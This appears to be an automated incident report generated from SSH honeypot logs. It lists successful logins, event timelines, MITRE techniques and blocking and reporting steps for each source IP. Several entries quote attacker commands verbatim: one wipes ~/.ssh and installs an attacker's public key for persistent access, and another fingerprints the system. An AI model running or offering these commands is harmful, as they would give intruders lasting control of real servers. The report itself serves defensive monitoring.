**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:12:48` | `cowrie.session.connect` |
| `2026-08-12 01:12:48` | `cowrie.client.version` |
| `2026-08-12 01:12:48` | `cowrie.client.kex` |
| `2026-08-12 01:12:48` | `cowrie.login.success` |
| `2026-08-12 01:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.161[.]148` to AbuseIPDB if not already reported
- [ ] Block `164.92.161[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5e6a747f2a96

| Field | Detail |
|---|---|
| **Source IP** | `164.92.161[.]148` |
| **First Seen** | 2026-08-12 01:12 |
| **Last Seen** | 2026-08-12 01:12 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:12:49` | `cowrie.session.connect` |
| `2026-08-12 01:12:49` | `cowrie.client.version` |
| `2026-08-12 01:12:49` | `cowrie.client.kex` |
| `2026-08-12 01:12:49` | `cowrie.login.success` |
| `2026-08-12 01:12:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.92.161[.]148` to AbuseIPDB if not already reported
- [ ] Block `164.92.161[.]148` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12d9a37118b6

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]13` |
| **First Seen** | 2026-08-12 01:14 |
| **Last Seen** | 2026-08-12 01:14 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:14:04` | `cowrie.session.connect` |
| `2026-08-12 01:14:04` | `cowrie.client.version` |
| `2026-08-12 01:14:04` | `cowrie.client.kex` |
| `2026-08-12 01:14:05` | `cowrie.login.success` |
| `2026-08-12 01:14:05` | `cowrie.session.params` |
| `2026-08-12 01:14:05` | `cowrie.command.input` |
| `2026-08-12 01:14:05` | `cowrie.command.failed` |
| `2026-08-12 01:14:06` | `cowrie.log.closed` |
| `2026-08-12 01:14:06` | `cowrie.session.params` |
| `2026-08-12 01:14:06` | `cowrie.command.input` |
| `2026-08-12 01:14:06` | `cowrie.session.file_download` |
| `2026-08-12 01:14:06` | `cowrie.log.closed` |
| `2026-08-12 01:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]13` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67820de27988

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]13` |
| **First Seen** | 2026-08-12 01:14 |
| **Last Seen** | 2026-08-12 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:14:06` | `cowrie.session.connect` |
| `2026-08-12 01:14:06` | `cowrie.client.version` |
| `2026-08-12 01:14:07` | `cowrie.client.kex` |
| `2026-08-12 01:14:07` | `cowrie.login.success` |
| `2026-08-12 01:14:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]13` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a95b2073953c

| Field | Detail |
|---|---|
| **Source IP** | `166.62.41[.]13` |
| **First Seen** | 2026-08-12 01:14 |
| **Last Seen** | 2026-08-12 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:14:07` | `cowrie.session.connect` |
| `2026-08-12 01:14:07` | `cowrie.client.version` |
| `2026-08-12 01:14:07` | `cowrie.client.kex` |
| `2026-08-12 01:14:08` | `cowrie.login.success` |
| `2026-08-12 01:14:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `166.62.41[.]13` to AbuseIPDB if not already reported
- [ ] Block `166.62.41[.]13` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e1ce42a9ef5

| Field | Detail |
|---|---|
| **Source IP** | `131.100.242[.]102` |
| **First Seen** | 2026-08-12 01:14 |
| **Last Seen** | 2026-08-12 01:14 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:14:31` | `cowrie.session.connect` |
| `2026-08-12 01:14:31` | `cowrie.client.version` |
| `2026-08-12 01:14:31` | `cowrie.client.kex` |
| `2026-08-12 01:14:32` | `cowrie.login.success` |
| `2026-08-12 01:14:33` | `cowrie.session.params` |
| `2026-08-12 01:14:33` | `cowrie.command.input` |
| `2026-08-12 01:14:33` | `cowrie.command.failed` |
| `2026-08-12 01:14:33` | `cowrie.log.closed` |
| `2026-08-12 01:14:34` | `cowrie.session.params` |
| `2026-08-12 01:14:34` | `cowrie.command.input` |
| `2026-08-12 01:14:34` | `cowrie.session.file_download` |
| `2026-08-12 01:14:34` | `cowrie.log.closed` |
| `2026-08-12 01:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.100.242[.]102` to AbuseIPDB if not already reported
- [ ] Block `131.100.242[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f53407b80fb2

| Field | Detail |
|---|---|
| **Source IP** | `131.100.242[.]102` |
| **First Seen** | 2026-08-12 01:14 |
| **Last Seen** | 2026-08-12 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:14:34` | `cowrie.session.connect` |
| `2026-08-12 01:14:34` | `cowrie.client.version` |
| `2026-08-12 01:14:34` | `cowrie.client.kex` |
| `2026-08-12 01:14:35` | `cowrie.login.success` |
| `2026-08-12 01:14:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.100.242[.]102` to AbuseIPDB if not already reported
- [ ] Block `131.100.242[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-258d4c6ecc62

| Field | Detail |
|---|---|
| **Source IP** | `131.100.242[.]102` |
| **First Seen** | 2026-08-12 01:14 |
| **Last Seen** | 2026-08-12 01:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:14:35` | `cowrie.session.connect` |
| `2026-08-12 01:14:35` | `cowrie.client.version` |
| `2026-08-12 01:14:35` | `cowrie.client.kex` |
| `2026-08-12 01:14:36` | `cowrie.login.success` |
| `2026-08-12 01:14:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `131.100.242[.]102` to AbuseIPDB if not already reported
- [ ] Block `131.100.242[.]102` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-105d65cf1591

| Field | Detail |
|---|---|
| **Source IP** | `94.198.221[.]101` |
| **First Seen** | 2026-08-12 01:18 |
| **Last Seen** | 2026-08-12 01:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:18:45` | `cowrie.session.connect` |
| `2026-08-12 01:18:45` | `cowrie.client.version` |
| `2026-08-12 01:18:45` | `cowrie.client.kex` |
| `2026-08-12 01:18:46` | `cowrie.login.success` |
| `2026-08-12 01:18:47` | `cowrie.session.params` |
| `2026-08-12 01:18:47` | `cowrie.command.input` |
| `2026-08-12 01:18:47` | `cowrie.command.failed` |
| `2026-08-12 01:18:47` | `cowrie.log.closed` |
| `2026-08-12 01:18:48` | `cowrie.session.params` |
| `2026-08-12 01:18:48` | `cowrie.command.input` |
| `2026-08-12 01:18:48` | `cowrie.session.file_download` |
| `2026-08-12 01:18:48` | `cowrie.log.closed` |
| `2026-08-12 01:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.198.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `94.198.221[.]101` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09051e138b11

| Field | Detail |
|---|---|
| **Source IP** | `94.198.221[.]101` |
| **First Seen** | 2026-08-12 01:18 |
| **Last Seen** | 2026-08-12 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:18:48` | `cowrie.session.connect` |
| `2026-08-12 01:18:48` | `cowrie.client.version` |
| `2026-08-12 01:18:48` | `cowrie.client.kex` |
| `2026-08-12 01:18:49` | `cowrie.login.success` |
| `2026-08-12 01:18:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.198.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `94.198.221[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1546cf040691

| Field | Detail |
|---|---|
| **Source IP** | `94.198.221[.]101` |
| **First Seen** | 2026-08-12 01:18 |
| **Last Seen** | 2026-08-12 01:18 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:18:49` | `cowrie.session.connect` |
| `2026-08-12 01:18:49` | `cowrie.client.version` |
| `2026-08-12 01:18:49` | `cowrie.client.kex` |
| `2026-08-12 01:18:50` | `cowrie.login.success` |
| `2026-08-12 01:18:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.198.221[.]101` to AbuseIPDB if not already reported
- [ ] Block `94.198.221[.]101` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-342a2aa53028

| Field | Detail |
|---|---|
| **Source IP** | `111.70.14[.]135` |
| **First Seen** | 2026-08-12 01:30 |
| **Last Seen** | 2026-08-12 01:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:30:39` | `cowrie.session.connect` |
| `2026-08-12 01:30:40` | `cowrie.client.version` |
| `2026-08-12 01:30:40` | `cowrie.client.kex` |
| `2026-08-12 01:30:42` | `cowrie.login.success` |
| `2026-08-12 01:30:43` | `cowrie.direct-tcpip.request` |
| `2026-08-12 01:30:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.70.14[.]135` to AbuseIPDB if not already reported
- [ ] Block `111.70.14[.]135` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58d2cefcd3a2

| Field | Detail |
|---|---|
| **Source IP** | `213.33.204[.]130` |
| **First Seen** | 2026-08-12 01:30 |
| **Last Seen** | 2026-08-12 01:30 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:30:52` | `cowrie.session.connect` |
| `2026-08-12 01:30:53` | `cowrie.client.version` |
| `2026-08-12 01:30:53` | `cowrie.client.kex` |
| `2026-08-12 01:30:54` | `cowrie.login.success` |
| `2026-08-12 01:30:54` | `cowrie.direct-tcpip.request` |
| `2026-08-12 01:30:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.33.204[.]130` to AbuseIPDB if not already reported
- [ ] Block `213.33.204[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-541677f4819c

| Field | Detail |
|---|---|
| **Source IP** | `122.187.104[.]70` |
| **First Seen** | 2026-08-12 01:31 |
| **Last Seen** | 2026-08-12 01:31 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:31:41` | `cowrie.session.connect` |
| `2026-08-12 01:31:41` | `cowrie.client.version` |
| `2026-08-12 01:31:41` | `cowrie.client.kex` |
| `2026-08-12 01:31:43` | `cowrie.login.success` |
| `2026-08-12 01:31:44` | `cowrie.direct-tcpip.request` |
| `2026-08-12 01:31:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.187.104[.]70` to AbuseIPDB if not already reported
- [ ] Block `122.187.104[.]70` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1b236cd3d348

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 01:37 |
| **Last Seen** | 2026-08-12 01:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:37:30` | `cowrie.session.connect` |
| `2026-08-12 01:37:30` | `cowrie.client.version` |
| `2026-08-12 01:37:30` | `cowrie.client.kex` |
| `2026-08-12 01:37:30` | `cowrie.login.success` |
| `2026-08-12 01:37:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-728ae0cd6014

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 01:37 |
| **Last Seen** | 2026-08-12 01:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:37:30` | `cowrie.session.connect` |
| `2026-08-12 01:37:30` | `cowrie.client.version` |
| `2026-08-12 01:37:30` | `cowrie.client.kex` |
| `2026-08-12 01:37:31` | `cowrie.login.success` |
| `2026-08-12 01:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd7dbff2149a

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 01:37 |
| **Last Seen** | 2026-08-12 01:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:37:31` | `cowrie.session.connect` |
| `2026-08-12 01:37:31` | `cowrie.client.version` |
| `2026-08-12 01:37:31` | `cowrie.client.kex` |
| `2026-08-12 01:37:31` | `cowrie.login.success` |
| `2026-08-12 01:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c76946641c0

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-08-12 01:37 |
| **Last Seen** | 2026-08-12 01:37 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:37:31` | `cowrie.session.connect` |
| `2026-08-12 01:37:31` | `cowrie.client.version` |
| `2026-08-12 01:37:31` | `cowrie.client.kex` |
| `2026-08-12 01:37:31` | `cowrie.login.success` |
| `2026-08-12 01:37:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0e5962ee7df

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 01:38 |
| **Last Seen** | 2026-08-12 01:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:38:42` | `cowrie.session.connect` |
| `2026-08-12 01:38:42` | `cowrie.client.version` |
| `2026-08-12 01:38:42` | `cowrie.client.kex` |
| `2026-08-12 01:38:42` | `cowrie.login.success` |
| `2026-08-12 01:38:42` | `cowrie.direct-tcpip.request` |
| `2026-08-12 01:38:43` | `cowrie.direct-tcpip.data` |
| `2026-08-12 01:38:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd9a2c402e4f

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 01:56 |
| **Last Seen** | 2026-08-12 01:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:56:58` | `cowrie.session.connect` |
| `2026-08-12 01:56:58` | `cowrie.client.version` |
| `2026-08-12 01:56:58` | `cowrie.client.kex` |
| `2026-08-12 01:57:00` | `cowrie.login.success` |
| `2026-08-12 01:57:01` | `cowrie.session.params` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.success` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:01` | `cowrie.command.input` |
| `2026-08-12 01:57:02` | `cowrie.log.closed` |
| `2026-08-12 01:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ddc25104ad62

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 01:57 |
| **Last Seen** | 2026-08-12 01:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:57:46` | `cowrie.session.connect` |
| `2026-08-12 01:57:46` | `cowrie.client.version` |
| `2026-08-12 01:57:46` | `cowrie.client.kex` |
| `2026-08-12 01:57:48` | `cowrie.login.success` |
| `2026-08-12 01:57:49` | `cowrie.session.params` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.success` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:49` | `cowrie.command.input` |
| `2026-08-12 01:57:50` | `cowrie.log.closed` |
| `2026-08-12 01:57:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25fad10a5b21

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-12 01:59 |
| **Last Seen** | 2026-08-12 01:59 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 01:59:39` | `cowrie.session.connect` |
| `2026-08-12 01:59:39` | `cowrie.client.version` |
| `2026-08-12 01:59:39` | `cowrie.client.kex` |
| `2026-08-12 01:59:41` | `cowrie.login.success` |
| `2026-08-12 01:59:42` | `cowrie.session.params` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:42` | `cowrie.command.success` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
| `2026-08-12 01:59:42` | `cowrie.command.input` |
